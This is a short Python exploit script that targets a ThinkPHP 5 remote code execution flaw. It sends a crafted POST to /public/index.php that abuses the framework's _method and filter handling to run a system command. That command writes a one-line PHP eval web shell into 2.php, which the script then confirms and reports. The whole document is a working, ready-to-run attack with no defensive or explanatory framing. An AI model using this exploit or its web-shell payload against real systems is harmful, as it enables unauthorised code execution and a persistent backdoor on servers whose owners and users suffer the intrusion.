import sys
import requests

def main(url):
    url_path = '%s/public/index.php'%url
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    }
    params = {
        "s":"captcha"
    }
    data = {
        "_method" : "__construct",
        "filter[]" : "system",
        "method" : "get",
        "server[REQUEST_METHOD]" : "echo '<?php @eval($_POST[chopper]);?>' >> 2.php"
    }
    r = requests.post(url_path, headers=headers, params=params, data=data)
    webshell_url = '%s/public/2.php'%url
    r = requests.get(webshell_url, headers=headers)
    if r.status_code == 200:
        print('thinkphp5 request rce exploit successful.')
        print('webshell:/public/2.php')

if __name__=='__main__':
    argvs = sys.argv
    if len(argvs) <= 1:
        print('using: python3 think_exp.py http://127.0.0.1/')
        sys.exit()
    url = argvs[1]
    main(url)